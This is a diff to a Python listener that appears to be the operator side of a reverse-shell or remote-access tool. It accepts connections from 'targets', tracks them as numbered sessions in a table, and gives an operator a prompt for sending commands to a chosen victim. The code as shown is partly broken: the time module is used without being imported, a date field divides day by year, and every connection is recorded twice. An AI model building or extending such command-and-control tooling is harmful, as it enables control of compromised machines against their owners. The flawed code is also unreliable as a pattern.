@@ -1,9 +1,8 @@
 import socket
 import sys
 import threading
-
-
-
+from prettytable import PrettyTable
+from datetime import datetime
 
 def comm_in(targ_id):
     print('[+] Awaiting response...')
@@ -11,6 +10,7 @@ def comm_in(targ_id):
     return response
 
 def comm_out(targ_id, message):
+    message = str(message)
     targ_id.send(message.encode())
     
     
@@ -49,7 +49,11 @@ def comm_handler():
         try:
             remote_target, remote_ip = sock.accept()
             targets.append([remote_target, remote_ip[0]])
-            print(f'[+] Connection received from {remote_ip[0]}\n' + 'Enter command #>', end="")
+            cur_time = time.strftime(":%H:%M:%S", time.localtime())
+            date = datetime.now()
+            time_record = (f"{date.month}/{date.day/date.year}{cur_time}")
+            targets.append([remote_target, remote_ip[0], time_record])
+            print(f'\n[+] Connection received from {remote_ip[0]}\n' + 'Enter command #>', end="")
         except:
             pass
 
@@ -96,16 +100,20 @@ if __name__ == '__main__':
             if command.split(" ")[0] == 'sessions':
                 session_counter = 0
                 if command.split (" ")[1] == '-1':
-                    print('Session' + ' ' * 10 + 'Target')
+                    myTable = PrettyTable()
+                    myTable.field_names = ['Session', 'Target']
+                    myTable.padding_width = 3
                     for target in targets:
-                        print(str(session_counter) + ' ' * 16 + target[1])
+                        myTable.add_row([session_counter, target[1]])
                         session_counter += 1
+                    print(myTable)
                 if command.split(" ")[1] == '-i':
-                    num = int(command.split("  ")[2])
-                    tar_id = (targets[num])[0]
+                    num = int(command.split(" ")[2])
+                    targ_id = (targets[num])[0]
                     target_comm(targ_id)
         except KeyboardInterrupt:
             print("\n[-] Keyboard interrupt issued")
+            kill_flag = 1
             message = 'Exiting due to keyboard interrupt'
-            remote_target.send(message.encode())
             sock.close()
+            break
